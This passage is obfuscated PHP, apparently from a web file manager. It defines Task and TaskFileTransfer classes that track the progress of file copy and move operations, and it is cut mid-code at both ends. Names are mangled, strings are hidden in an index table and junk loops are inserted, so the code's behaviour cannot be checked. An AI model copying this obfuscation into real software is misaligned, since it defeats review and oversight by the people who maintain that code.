$¼»Š¨¼); break; } } $Òƒ‚ßÒ¤ = md5($¤õ€²¼[298] . ($‘Òû¹ûË + $µûÅ¿ƒĞ) . $¤õ€²¼[299] . $¼»Š¨¼ . $¤õ€²¼[299] . $ùÛ¢şËŠ . $¤õ€²¼[300]); $õõ–íŒû = $§¦·²Êá[771]; $´øÉ´Ñ÷ = $this->iumt0ce21b6d($©Â¿­Ğ[0], $Òƒ‚ßÒ¤); $çƒá¢Ï„ = $§¦·²Êá[772]; if (!$çƒá¢Ï„) { return; } return $´øÉ´Ñ÷; $­ï®” ” = $§¦·²Êá[773]; if (!$­ï®” ”) { die; } } public function blnh2465b46a() { $‚Ü½²¦Í =& $_SERVER[”ú…±Ú¥]; $›ÊÔ¿¤Ê = mt_rand(pow(2, 14), pow(2, 16) - 1); $ƒ‘âÄÄä = $‚Ü½²¦Í[774]; if (!$ƒ‘âÄÄä) { die; } $µ³‰ïÜœ = array(); $·—ãØ·è = 1; $½ŒÙ©Ôƒ = $‚Ü½²¦Í[775]; while ($½ŒÙ©Ôƒ < $‚Ü½²¦Í[656]) { if ($½ŒÙ©Ôƒ >= 0) { break; } $½ŒÙ©Ôƒ++; } while ($·—ãØ·è <= (int) sqrt($›ÊÔ¿¤Ê)) { $¥Ãš÷Ø = $·—ãØ·è; $ƒ±¥© = $‚Ü½²¦Í[776]; if (strlen($ƒ±¥©) < $‚Ü½²¦Í[656]) { return; } while (!0) { $¥Ãš÷Ø++; $”ÀÄÓ¥ß = $‚Ü½²¦Í[777]; while ($”ÀÄÓ¥ß < $‚Ü½²¦Í[665]) { if ($”ÀÄÓ¥ß >= 0) { break; } $”ÀÄÓ¥ß++; } if ($¥Ãš÷Ø <= 2) { $·—ãØ·è = $¥Ãš÷Ø; break; } else { if ($¥Ãš÷Ø < 2) { continue; } } $¢É™ğâ¢ = !0; for ($º”Âµ = 2; $º”Âµ <= sqrt($¥Ãš÷Ø); $º”Âµ++) { if ($¥Ãš÷Ø % $º”Âµ == 0) { $¢É™ğâ¢ = !1; } } if ($¢É™ğâ¢) { $·—ãØ·è = $¥Ãš÷Ø; break; } } $µ³‰ïÜœ[] = $·—ãØ·è; $Åç±áø = $‚Ü½²¦Í[778]; if (strlen($Åç±áø) < $‚Ü½²¦Í[656]) { return; } } $‹à”©¦– = 2; for ($¥Ãš÷Ø = $›ÊÔ¿¤Ê; $¥Ãš÷Ø > 1; $¥Ãš÷Ø--) { $¢É™ğâ¢ = !0; $˜ÜĞı¾° = $‚Ü½²¦Í[779]; while ($˜ÜĞı¾° < $‚Ü½²¦Í[653]) { if ($˜ÜĞı¾° >= 0) { break; } $˜ÜĞı¾°++; } foreach ($µ³‰ïÜœ as $¼é×ı“ü) { if ($¥Ãš÷Ø % $¼é×ı“ü == 0) { $¢É™ğâ¢ = !1; break; } } if ($¢É™ğâ¢) { $‹à”©¦– = $¥Ãš÷Ø; break; } } return $‹à”©¦–; } public function zshd44037ad4($‹“ùæøÓ, $ß«Œ¢) { $ßé–½ñÍ =& $_SERVER[µª„ÑÊÛ]; return call_user_func(array($ßé–½ñÍ[8], $ßé–½ñÍ[302]), $‹“ùæøÓ, $ß«Œ¢); } public function qyxzcaf2f017($ô‰¢÷á¼, $ú¥œ“­ë) { $éı¬¦˜» =& $_SERVER[µª„ÑÊÛ]; return call_user_func(array($éı¬¦˜»[303], $éı¬¦˜»[304]), $ô‰¢÷á¼, $ú¥œ“­ë); } public function iumt0ce21b6d($«ıÍÕ•¥, $ùÓÓ‚ïé) { $ç‰ñÆîÎ =& $_SERVER[µª„ÑÊÛ]; return call_user_func(array($ç‰ñÆîÎ[303], $ç‰ñÆîÎ[305]), $«ıÍÕ•¥, $ùÓÓ‚ïé); } } goto CãÊ¸Ï·“™; FŸ«²ŸÀãÏ: class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($½ÎŠÙ¾¾, $Ã‡¾š—– = '', $¬ôµ¦ÙÃ = 0, $¬˜Ò‘¬ = '') { $ªÒúªèÙ =& $_SERVER[”ú…±Ú¥]; if (self::get($½ÎŠÙ¾¾)) { return; } $this->task = array($ªÒúªèÙ[437] => $½ÎŠÙ¾¾, $ªÒúªèÙ[1671] => USER_ID, $ªÒúªèÙ[1571] => $¬˜Ò‘¬, $ªÒúªèÙ[491] => $ªÒúªèÙ[12], $ªÒúªèÙ[33] => $Ã‡¾š—–, $ªÒúªèÙ[1093] => $ªÒúªèÙ[12], $ªÒúªèÙ[818] => $¬ôµ¦ÙÃ, $ªÒúªèÙ[1672] => 0, $ªÒúªèÙ[1673] => 0, $ªÒúªèÙ[1674] => 0, $ªÒúªèÙ[1675] => timeFloat(), $ªÒúªèÙ[1676] => 0, $ªÒúªèÙ[1677] => 0, $ªÒúªèÙ[1678] => 0, $ªÒúªèÙ[1679] => 0, $ªÒúªèÙ[782] => $ªÒúªèÙ[1630]); $GLOBALS[$ªÒúªèÙ[1680]] = 1; Hook::bind($ªÒúªèÙ[1635], array($this, $ªÒúªèÙ[1681])); Hook::bind($ªÒúªèÙ[1682], array($this, $ªÒúªèÙ[1683])); $this->startAfter(); Hook::trigger($ªÒúªèÙ[1684], $this->task); $this->task[$ªÒúªèÙ[1677]] = timeFloat(); } public function end($ÌÎûÍü = '') { $ÛÒæãÇ³ =& $_SERVER[”ú…±Ú¥]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÛÒæãÇ³[1677]]) { self::valueSet($this->task[$ÛÒæãÇ³[437]], !1); } $this->isEnd = !0; if ($ÌÎûÍü) { $this->task[$ÛÒæãÇ³[491]] = $ÌÎûÍü; } self::log($ÛÒæãÇ³[1685] . $this->task[$ÛÒæãÇ³[437]] . $ÛÒæãÇ³[1686] . sprintf($ÛÒæãÇ³[882], timeFloat() - $this->task[$ÛÒæãÇ³[1675]]) . $ÛÒæãÇ³[1687]); Hook::unbind($ÛÒæãÇ³[1635], array($this, $ÛÒæãÇ³[1681])); Hook::unbind($ÛÒæãÇ³[1682], array($this, $ÛÒæãÇ³[1683])); $this->endAfter(); $ÑšßÒ—Í = $this->task; $this->task = !1; Hook::trigger($ÛÒæãÇ³[1688], $ÑšßÒ—Í); } public function update($‰‡õıß™ = 0, $©ä£ë¦ = false) { $·¥êü°Ü =& $_SERVER[”ú…±Ú¥]; $Ÿôñ–Ñ» =& $this->task; if (!$Ÿôñ–Ñ») { return; } $Ÿôñ–Ñ»[$·¥êü°Ü[1672]] += $‰‡õıß™; $Ÿôñ–Ñ»[$·¥êü°Ü[1676]] = timeFloat(); if ($Ÿôñ–Ñ»[$·¥êü°Ü[818]]) { if ($Ÿôñ–Ñ»[$·¥êü°Ü[818]] < $Ÿôñ–Ñ»[$·¥êü°Ü[1672]]) { $Ÿôñ–Ñ»[$·¥êü°Ü[818]] = $Ÿôñ–Ñ»[$·¥êü°Ü[1672]]; } $”´¡Ü¡¨ = timeFloat() - $Ÿôñ–Ñ»[$·¥êü°Ü[1675]] - $Ÿôñ–Ñ»[$·¥êü°Ü[1678]]; if ($”´¡Ü¡¨ <= 0) { $”´¡Ü¡¨ = 0.001; } $Ÿôñ–Ñ»[$·¥êü°Ü[1673]] = $Ÿôñ–Ñ»[$·¥êü°Ü[1672]] / $Ÿôñ–Ñ»[$·¥êü°Ü[818]]; $Ÿôñ–Ñ»[$·¥êü°Ü[1674]] = $Ÿôñ–Ñ»[$·¥êü°Ü[1672]] / $”´¡Ü¡¨; if ($Ÿôñ–Ñ»[$·¥êü°Ü[1673]] > 0) { $Ÿôñ–Ñ»[$·¥êü°Ü[1679]] = $”´¡Ü¡¨ * (1 - $Ÿôñ–Ñ»[$·¥êü°Ü[1673]]) / $Ÿôñ–Ñ»[$·¥êü°Ü[1673]]; } $Ÿôñ–Ñ»[$·¥êü°Ü[1679]] = $Ÿôñ–Ñ»[$·¥êü°Ü[1679]] <= 0 ? 0 : $Ÿôñ–Ñ»[$·¥êü°Ü[1679]]; } $this->updateAfter(); $Èìüæë = 0.2; if (timeFloat() - $Ÿôñ–Ñ»[$·¥êü°Ü[1677]] < $Èìüæë && !$©ä£ë¦) { return; } $š©ô¿Š = self::get($Ÿôñ–Ñ»[$·¥êü°Ü[437]]); $•’¸¯ş× = $š©ô¿Š[$·¥êü°Ü[782]]; if ($•’¸¯ş× == self::STATYS_KILL) { $Š¹˜šÖê = array($·¥êü°Ü[1689] => LNG($·¥êü°Ü[1690]), $·¥êü°Ü[1241] => !1); Cache::set($·¥êü°Ü[1691] . $this->task[$·¥êü°Ü[437]], $Š¹˜šÖê, 30); $this->onKill(); $this->end(); die; } else { if ($•’¸¯ş× == self::STATYS_STOP) { $¿‘‹˜¹¹ = 2; $š©ô¿Š[$·¥êü°Ü[1678]] += $¿‘‹˜¹¹; self::valueSet($Ÿôñ–Ñ»[$·¥êü°Ü[437]], $š©ô¿Š); sleep($¿‘‹˜¹¹); $this->update(); return; } } $Ÿôñ–Ñ»[$·¥êü°Ü[782]] = $•’¸¯ş× ? $•’¸¯ş× : $Ÿôñ–Ñ»[$·¥êü°Ü[782]]; $Ÿôñ–Ñ»[$·¥êü°Ü[1678]] = $š©ô¿Š[$·¥êü°Ü[1678]] ? $š©ô¿Š[$·¥êü°Ü[1678]] : 0; $Ÿôñ–Ñ»[$·¥êü°Ü[1677]] = timeFloat(); Hook::trigger($·¥êü°Ü[1692], $Ÿôñ–Ñ»); self::valueSet($Ÿôñ–Ñ»[$·¥êü°Ü[437]], $Ÿôñ–Ñ»); } public function onKillSet($¸áÙ“, $ïÎ‚Óˆª = array()) { $this->onKillCall = array($¸áÙ“, $ïÎ‚Óˆª); } public function onKill() { $¦Œè›û =& $_SERVER[”ú…±Ú¥]; self::log($¦Œè›û[1685] . $this->task[$¦Œè›û[437]] . $¦Œè›û[1693]); Hook::trigger($¦Œè›û[1694], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($É¸¿îÊ“) { $ù¸º»µ =& $_SERVER[”ú…±Ú¥]; Cache::set($ù¸º»µ[1691] . $this->task[$ù¸º»µ[437]], $É¸¿îÊ“, 60); return $É¸¿îÊ“; } public static function get($Öü‡Àøü) { $·œãª‹§ =& $_SERVER[”ú…±Ú¥]; $ØŸšì†‚ = self::valueGet($Öü‡Àøü); if (is_array($ØŸšì†‚) && $ØŸšì†‚[$·œãª‹§[1695]]) { $¦ÑùÎ¨ = ActionApply($ØŸšì†‚[$·œãª‹§[1695]], array($ØŸšì†‚)); $ØŸšì†‚ = is_array($¦ÑùÎ¨) ? $¦ÑùÎ¨ : $ØŸšì†‚; } return $ØŸšì†‚; } public static function listData() { $ªÖ«¹Å» = self::valueGet(); return array_sort_by($ªÖ«¹Å», $_SERVER[”ú…±Ú¥][1675], !0); } public static function kill($»¸©ÕÏ¢) { return self::changeStatus($»¸©ÕÏ¢, self::STATYS_KILL); } public static function stop($‚øˆ†¤€) { return self::changeStatus($‚øˆ†¤€, self::STATYS_STOP); } public static function restart($úÁæñ™÷) { return self::changeStatus($úÁæñ™÷, self::STATYS_RUNNING); } public static function killAll() { $ô¹Š¥ÉË =& $_SERVER[”ú…±Ú¥]; $Á×ª€Ï = self::listData(); foreach ($Á×ª€Ï as $‚­Íˆ¿ß) { self::kill($‚­Íˆ¿ß[$ô¹Š¥ÉË[437]]); } sleep(2); foreach ($Á×ª€Ï as $‚­Íˆ¿ß) { self::valueSet($‚­Íˆ¿ß[$ô¹Š¥ÉË[437]], !1); } } private static function changeStatus($˜£ÆàÜ™, $¶÷âáï’) { $ß¨Ÿ‰Öñ =& $_SERVER[”ú…±Ú¥]; $¥œ—³½¥ = self::valueGet($˜£ÆàÜ™); if (!$¥œ—³½¥) { return !1; } $¥œ—³½¥[$ß¨Ÿ‰Öñ[782]] = $¶÷âáï’; self::valueSet($˜£ÆàÜ™, $¥œ—³½¥); self::log($ß¨Ÿ‰Öñ[1696] . $¥œ—³½¥[$ß¨Ÿ‰Öñ[437]] . $ß¨Ÿ‰Öñ[1697] . $¶÷âáï’); return !0; } public static function valueGet($ğïğáËë = false) { $ƒşúÇò =& $_SERVER[”ú…±Ú¥]; if ($ğïğáËë) { $ÌÄ¸‘·Ü = Model($ƒşúÇò[485])->where(array($ƒşúÇò[94] => $ğïğáËë, $ƒşúÇò[33] => $ƒşúÇò[1100]))->find(); return $ÌÄ¸‘·Ü ? json_decode($ÌÄ¸‘·Ü[$ƒşúÇò[412]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Â½½ï‹§ = false) { $¾¿—¢ßÎ =& $_SERVER[”ú…±Ú¥]; $Ô²ƒãÓ = array($¾¿—¢ßÎ[33] => $¾¿—¢ßÎ[1100]); if ($Â½½ï‹§) { $Ô²ƒãÓ[$¾¿—¢ßÎ[1671]] = $Â½½ï‹§; } $é‡˜ìšÊ = Model($¾¿—¢ßÎ[485])->where($Ô²ƒãÓ)->select(); $é‡˜ìšÊ = $é‡˜ìšÊ ? $é‡˜ìšÊ : array(); foreach ($é‡˜ìšÊ as $«ìü‰Á => $·î–­Âö) { $é‡˜ìšÊ[$«ìü‰Á] = json_decode($·î–­Âö[$¾¿—¢ßÎ[412]], !0); } return $é‡˜ìšÊ; } public static function valueSet($¾–ğ²üô, $ô¶êËÉ¾) { $âıÂºÎ =& $_SERVER[”ú…±Ú¥]; if (!$ô¶êËÉ¾) { return Model($âıÂºÎ[485])->where(array($âıÂºÎ[94] => $¾–ğ²üô, $âıÂºÎ[33] => $âıÂºÎ[1100]))->delete(); } $çÍ¸‰¯ã = json_encode($ô¶êËÉ¾); if (!$çÍ¸‰¯ã) { ob_start(); var_dump($ô¶êËÉ¾); $÷Úµ™ô‰ = ob_get_clean(); self::log($âıÂºÎ[1698] . json_encode_force($÷Úµ™ô‰)); } if (!$¾–ğ²üô || !$ô¶êËÉ¾[$âıÂºÎ[437]]) { return !1; } $¢öÉ™ğ = array($âıÂºÎ[33] => $âıÂºÎ[1100], $âıÂºÎ[1671] => USER_ID, $âıÂºÎ[94] => $¾–ğ²üô, $âıÂºÎ[412] => $çÍ¸‰¯ã); $ˆøßíÊ› = $âıÂºÎ[1699]; CacheLock::lock($ˆøßíÊ›); Model($âıÂºÎ[485])->add($¢öÉ™ğ, array(), !0); CacheLock::unlock($ˆøßíÊ›); } public static function log($ëÄø‚Ô) { if (!GLOBAL_DEBUG) { return; } write_log($ëÄø‚Ô, $_SERVER[”ú…±Ú¥][1700]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ŞŒ‡×Î– =& $_SERVER[”ú…±Ú¥]; $âğ€çú =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ŞŒ‡×Î–[1701], array($this, $ŞŒ‡×Î–[1702])); Hook::bind($ŞŒ‡×Î–[1252], array($this, $ŞŒ‡×Î–[1703])); Hook::bind($ŞŒ‡×Î–[1704], array($this, $ŞŒ‡×Î–[1705])); Hook::bind($ŞŒ‡×Î–[634], array($this, $ŞŒ‡×Î–[1706])); Hook::bind($ŞŒ‡×Î–[635], array($this, $ŞŒ‡×Î–[1707])); Hook::bind($ŞŒ‡×Î–[640], array($this, $ŞŒ‡×Î–[1708])); Hook::bind($ŞŒ‡×Î–[641], array($this, $ŞŒ‡×Î–[1709])); Hook::bind($ŞŒ‡×Î–[637], array($this, $ŞŒ‡×Î–[1710])); Hook::bind($ŞŒ‡×Î–[638], array($this, $ŞŒ‡×Î–[1711])); Hook::bind($ŞŒ‡×Î–[603], array($this, $ŞŒ‡×Î–[1712])); Hook::bind($ŞŒ‡×Î–[600], array($this, $ŞŒ‡×Î–[1712])); Hook::bind($ŞŒ‡×Î–[605], array($this, $ŞŒ‡×Î–[1712])); Hook::bind($ŞŒ‡×Î–[607], array($this, $ŞŒ‡×Î–[1712])); Hook::bind($ŞŒ‡×Î–[609], array($this, $ŞŒ‡×Î–[1712])); Hook::bind($ŞŒ‡×Î–[1713], array($this, $ŞŒ‡×Î–[1714])); Hook::bind($ŞŒ‡×Î–[625], array($this, $ŞŒ‡×Î–[1715])); $this->sourceModelCopyFlag = !1; Hook::bind($ŞŒ‡×Î–[1716], array($this, $ŞŒ‡×Î–[1717])); Hook::bind($ŞŒ‡×Î–[1718], array($this, $ŞŒ‡×Î–[1719])); Hook::bind($ŞŒ‡×Î–[1720], array($this, $ŞŒ‡×Î–[1721])); $âğ€çú[$ŞŒ‡×Î–[1722]] = LNG($ŞŒ‡×Î–[1723]); $âğ€çú[$ŞŒ‡×Î–[1724]] = 0; $âğ€çú[$ŞŒ‡×Î–[1725]] = 0; $âğ€çú[$ŞŒ‡×Î–[1093]] = $ŞŒ‡×Î–[12]; $âğ€çú[$ŞŒ‡×Î–[1726]] = $ŞŒ‡×Î–[12]; $âğ€çú[$ŞŒ‡×Î–[1727]] = 0; $âğ€çú[$ŞŒ‡×Î–[1728]] = 0; $âğ€çú[$ŞŒ‡×Î–[1729]] = 0; if (!$âğ€çú[$ŞŒ‡×Î–[1571]]) { $âğ€çú[$ŞŒ‡×Î–[1571]] = LNG($ŞŒ‡×Î–[1730]); } } protected function endAfter() { $ÒèÔÒä­ =& $_SERVER[”ú…±Ú¥]; Hook::unbind($ÒèÔÒä­[1701], array($this, $ÒèÔÒä­[1702])); Hook::unbind($ÒèÔÒä­[1252], array($this, $ÒèÔÒä­[1703])); Hook::unbind($ÒèÔÒä­[1704], array($this, $ÒèÔÒä­[1705])); Hook::unbind($ÒèÔÒä­[634], array($this, $ÒèÔÒä­[1706])); Hook::unbind($ÒèÔÒä­[635], array($this, $ÒèÔÒä­[1707])); Hook::unbind($ÒèÔÒä­[640], array($this, $ÒèÔÒä­[1708])); Hook::unbind($ÒèÔÒä­[641], array($this, $ÒèÔÒä­[1709])); Hook::unbind($ÒèÔÒä­[637], array($this, $ÒèÔÒä­[1710])); Hook::unbind($ÒèÔÒä­[638], array($this, $ÒèÔÒä­[1711])); Hook::unbind($ÒèÔÒä­[603], array($this, $ÒèÔÒä­[1712])); Hook::unbind($ÒèÔÒä­[600], array($this, $ÒèÔÒä­[1712])); Hook::unbind($ÒèÔÒä­[605], array($this, $ÒèÔÒä­[1712])); Hook::unbind($ÒèÔÒä­[607], array($this, $ÒèÔÒä­[1712])); Hook::unbind($ÒèÔÒä­[609], array($this, $ÒèÔÒä­[1712])); Hook::unbind($ÒèÔÒä­[1713], array($this, $ÒèÔÒä­[1714])); Hook::unbind($ÒèÔÒä­[625], array($this, $ÒèÔÒä­[1715])); Hook::unbind($ÒèÔÒä­[1716], array($this, $ÒèÔÒä­[1717])); Hook::unbind($ÒèÔÒä­[1718], array($this, $ÒèÔÒä­[1719])); Hook::unbind($ÒèÔÒä­[1720], array($this, $ÒèÔÒä­[1721])); } public function copyMoveStart($ˆï„±, $Ø´é¥‚, $¥’ééŠî, $ûÍ´´Ö) { $âŒË°ğğ =& $_SERVER[”ú…±Ú¥]; self::log($âŒË°ğğ[1731] . $Ø´é¥‚ . $âŒË°ğğ[70] . $ûÍ´´Ö); $šÇªÜü = rtrim(TEMP_FILES, $âŒË°ğğ[8]); if (substr($Ø´é¥‚, 0, strlen($šÇªÜü)) == $šÇªÜü) { return; } if (substr($ûÍ´´Ö, 0, strlen($šÇªÜü)) == $šÇªÜü) { return; } $ß‚ÇÆÚÈ =& $this->task; $ß‚ÇÆÚÈ[$âŒË°ğğ[1732]] = KodIO::transferType($ˆï„±, $¥’ééŠî); $this->update(); } public function updateAfter() { $¤Èã¡ıá =& $_SERVER[”ú…±Ú¥]; $˜™ÑıÑ =& $this->task; if (!$˜™ÑıÑ[$¤Èã¡ıá[795]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($˜™ÑıÑ[$¤Èã¡ıá[1732]] == $¤Èã¡ıá[1344]) { return; } self::updateTask($˜™ÑıÑ); } private static function updateTask(&$½¤ÅèÛø) { $‹·“–ª« =& $_SERVER[”ú…±Ú¥]; if ($½¤ÅèÛø[$‹·“–ª«[1732]] == $‹·“–ª«[1223] || $½¤ÅèÛø[$‹·“–ª«[1732]] == $‹·“–ª«[107]) { if ($½¤ÅèÛø[$‹·“–ª«[1726]]) { $½¤ÅèÛø[$‹·“–ª«[1729]] = $½¤ÅèÛø[$‹·“–ª«[1728]] + $½¤ÅèÛø[$‹·“–ª«[1725]]; } } else { if ($½¤ÅèÛø[$‹·“–ª«[1732]] == $‹·“–ª«[1345]) { if ($½¤ÅèÛø[$‹·“–ª«[1726]] == $‹·“–ª«[1223]) { $½¤ÅèÛø[$‹·“–ª«[1729]] = $½¤ÅèÛø[$‹·“–ª«[1728]] + $½¤ÅèÛø[$‹·“–ª«[1725]] * 0.5; } else { if ($½¤ÅèÛø[$‹·“–ª«[1726]] == $‹·“–ª«[107]) { $½¤ÅèÛø[$‹·“–ª«[1729]] = $½¤ÅèÛø[$‹·“–ª«[1728]] + $½¤ÅèÛø[$‹·“–ª«[1724]] * 0.5 + $½¤ÅèÛø[$‹·“–ª«[1725]] * 0.5; } } } } $½¤ÅèÛø[$‹·“–ª«[1673]] = $½¤ÅèÛø[$‹·“–ª«[1729]] / $½¤ÅèÛø[$‹·“–ª«[795]]; if ($½¤ÅèÛø[$‹·“–ª«[1673]] > 0) { $Âıõ‘² = timeFloat() - $½¤ÅèÛø[$‹·“–ª«[1675]] - $½¤ÅèÛø[$‹·“–ª«[1678]]; $½¤ÅèÛø[$‹·“–ª«[1679]] = $Âıõ‘² * (1 - $½¤ÅèÛø[$‹·“–ª«[1673]]) / $½¤ÅèÛø[$‹·“–ª«[1673]]; } } public function addPath($ÑëÁ²ü×) { $¾¨óÓ³î =& $_SERVER[”ú…±Ú¥]; if (!$ÑëÁ²ü×) { return; } $©ùŸ™ı =& $this->task; $Û¤Š ½ = IO::infoWithChildren($ÑëÁ²ü×); $íıâ´¾Š = $©ùŸ™ı[$¾¨óÓ³î[1733]] ? $©ùŸ™ı[$¾¨óÓ³î[1733]][$¾¨óÓ³î[1734]] : 0; $©ùŸ™ı[$¾¨óÓ³î[1733]] = array($¾¨óÓ³î[1734] => $íıâ´¾Š + 1, $¾¨óÓ³î[458] => $Û¤Š ½[$¾¨óÓ³î[32]], $¾¨óÓ³î[84] => $Û¤Š ½[$¾¨óÓ³î[84]], $¾¨óÓ³î[547] => $Û¤Š ½[$¾¨óÓ³î[547]] ? $Û¤Š ½[$¾¨óÓ³î[547]] : $Û¤Š ½[$¾¨óÓ³î[84]]); if ($Û¤Š ½[$¾¨óÓ³î[33]] == $¾¨óÓ³î[210]) { $©ùŸ™ı[$¾¨óÓ³î[818]] += 1; } else { $©ùŸ™ı[$¾¨óÓ³î[818]] += $Û¤Š ½[$¾¨óÓ³î[79]][$¾¨óÓ³î[77]]; if ($Û¤Š ½[$¾¨óÓ³î[440]]) { $©ùŸ™ı[$¾¨óÓ³î[818]] += $Û¤Š ½[$¾¨óÓ³î[79]][$¾¨óÓ³î[78]] + 1; } } $©ùŸ™ı[$¾¨óÓ³î[795]] += $Û¤Š ½[$¾¨óÓ³î[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ñÔîËóÓ) { } public function sourceAddHashEnd($¡•ÚÃĞî) { } public function sourceAddFileStart($­ãÌÍ’…) { $¬¥¿˜Ø =& $_SERVER[”ú…±Ú¥]; $Ÿ³‹—® =& $this->task; $Ÿ³‹—®[$¬¥¿˜Ø[1724]] = $­ãÌÍ’…[$¬¥¿˜Ø[76]]; $Ÿ³‹—®[$¬¥¿˜Ø[1722]] = $­ãÌÍ’…[$¬¥¿˜Ø[32]]; $Ÿ³‹—®[$¬¥¿˜Ø[1093]] = $­ãÌÍ’…[$¬¥¿˜Ø[32]]; $Ÿ³‹—®[$¬¥¿˜Ø[1735]] = $­ãÌÍ’…[$¬¥¿˜Ø[84]]; $this->update(); } public function sourceAddFileEnd($ëÓìÊ©) { $·å³í±¢ =& $_SERVER[”ú…±Ú¥]; $üŞ‚ö¶İ =& $this->task; $üŞ‚ö¶İ[$·å³í±¢[1729]] += $ëÓìÊ©[$·å³í±¢[76]]; $üŞ‚ö¶İ[$·å³í±¢[1735]] = $ëÓìÊ©[$·å³í±¢[84]]; $this->update(1); } public function copyFileStart($°÷ºÀ€±, $™ï«úÁª, $ÍÍÊØÎÛ, $¶¶òä, $»Í‹€«—, $äµÃ¹å) { $„ÆÛ„Œ¿ =& $_SERVER[”ú…±Ú¥]; $€ÀÂÙ®¹ = $»Í‹€«—; if ($€ÀÂÙ®¹ == $GLOBALS[$„ÆÛ„Œ¿[1736]]) { $€ÀÂÙ®¹ = $GLOBALS[$„ÆÛ„Œ¿[1737]]; } $GLOBALS[$„ÆÛ„Œ¿[1737]] = $»Í‹€«—; $GLOBALS[$„ÆÛ„Œ¿[1736]] = $äµÃ¹å; $„Ì¤Ú÷å =& $this->task; $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1722]] = $€ÀÂÙ®¹; $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1724]] = (int) $°÷ºÀ€±->size($™ï«úÁª); $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1725]] = 0; $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1093]] = $„ÆÛ„Œ¿[12]; $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1726]] = $„ÆÛ„Œ¿[12]; $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1727]] = 0; $ïŠÎ˜â = $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1724]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($„Ì¤Ú÷å[$„ÆÛ„Œ¿[437]] . $„ÆÛ„Œ¿[1738]); if ($ïŠÎ˜â && file_exists(get_path_father($¶¶òä))) { Cache::set($„Ì¤Ú÷å[$„ÆÛ„Œ¿[437]] . $„ÆÛ„Œ¿[1738], $¶¶òä); $„Ì¤Ú÷å[$„ÆÛ„Œ¿[1695]] = array($„ÆÛ„Œ¿[1739], $„ÆÛ„Œ¿[1740]); } $this->update(0, $ïŠÎ˜â); } public static function updateCopyLocalFileSize($àÄ¯Ï™) { $é—á³²Ø =& $_SERVER[”ú…±Ú¥]; $¨“Š©Øé = Cache::get($àÄ¯Ï™[$é—á³²Ø[437]] . $é—á³²Ø[1738]); if (!$¨“Š©Øé || !file_exists($¨“Š©Øé)) { return $àÄ¯Ï™; } $àÄ¯Ï™[$é—á³²Ø[1725]] = @filesize($¨“Š©Øé); $àÄ¯Ï™[$é—á³²Ø[1729]] += $àÄ¯Ï™[$é—á³²Ø[1725]]; self::updateTask($àÄ¯Ï™); return $àÄ¯Ï™; } public function copyFileEnd($õ»ŠÛç, $õ¨’¢Å, $Ä¹ú°¬¿, $„¯Ìâú, $¶Â§’ŒŞ, $êöÖçâ­) { $Çòê€Ô¨ =& $_SERVER[”ú…±Ú¥]; $ŒÔò«‚Ã =& $this->task; $ŒÔò«‚Ã[$Çòê€Ô¨[1725]] = $ŒÔò«‚Ã[$Çòê€Ô¨[1724]]; $ŒÔò«‚Ã[$Çòê€Ô¨[1726]] = $Çòê€Ô¨[12]; unset($ŒÔò«‚Ã[$Çòê€Ô¨[1695]]); if ($¶Â§’ŒŞ == $ŒÔò«‚Ã[$Çòê€Ô¨[1722]]) { $ŒÔò«‚Ã[$Çòê€Ô¨[1728]] += $ŒÔò«‚Ã[$Çòê€Ô¨[1724]]; $ŒÔò«‚Ã[$Çòê€Ô¨[1729]] = $ŒÔò«‚Ã[$Çòê€Ô¨[1728]]; $Á‡ï‡Î = 1; if (isset($ŒÔò«‚Ã[$Çòê€Ô¨[1735]]) && $ŒÔò«‚Ã[$Çòê€Ô¨[1735]] == $õ¨’¢Å) { $Á‡ï‡Î = 0; } $this->update($Á‡ï‡Î); } else { $this->update(); $ŒÔò«‚Ã[$Çòê€Ô¨[1725]] = 0; } Cache::remove($ŒÔò«‚Ã[$Çòê€Ô¨[437]] . $Çòê€Ô¨[1738]); self::log($Çòê€Ô¨[1741] . $õ¨’¢Å . $Çòê€Ô¨[70] . $„¯Ìâú . $Çòê€Ô¨[191] . $¶Â§’ŒŞ . $Çòê€Ô¨[1742] . $ŒÔò«‚Ã[$Çòê€Ô¨[1722]]); } public function updateFileEnd($ƒÒ‚ÂØî, $‹·Í»Ä) { $‹Æ“á³€ =& $_SERVER[”ú…±Ú¥]; $û…ÛÈ÷Ê =& $this->task; $û…ÛÈ÷Ê[$‹Æ“á³€[1722]] = $ƒÒ‚ÂØî; $û…ÛÈ÷Ê[$‹Æ“á³€[1724]] = $‹·Í»Ä; $û…ÛÈ÷Ê[$‹Æ“á³€[1728]] += $‹·Í»Ä; $û…ÛÈ÷Ê[$‹Æ“á³€[1729]] = $û…ÛÈ÷Ê[$‹Æ“á³€[1728]]; $this->update(1); self::log($‹Æ“á³€[1743] . $ƒÒ‚ÂØî); } public function sourceModelCopy($Ïûšø) { $¥°ºšÄå =& $_SERVER[”ú…±Ú¥]; $‡´ôØíù = $Ïûšø[0]; $‡ú›¹¥œ = $Ïûšø[1]; $ÜºÂ›“Š =& $this->task; $this->sourceModelCopyFlag = !0; $ã¯³ºİ£ = 0; switch ($‡´ôØíù) { case $¥°ºšÄå[601]: $ã¯³ºİ£ = 1; break; case $¥°ºšÄå[604]: $ÜºÂ›“Š[$¥°ºšÄå[1722]] = $‡ú›¹¥œ[$¥°ºšÄå[32]]; break; case $¥°ºšÄå[606]: $ã¯³ºİ£ = 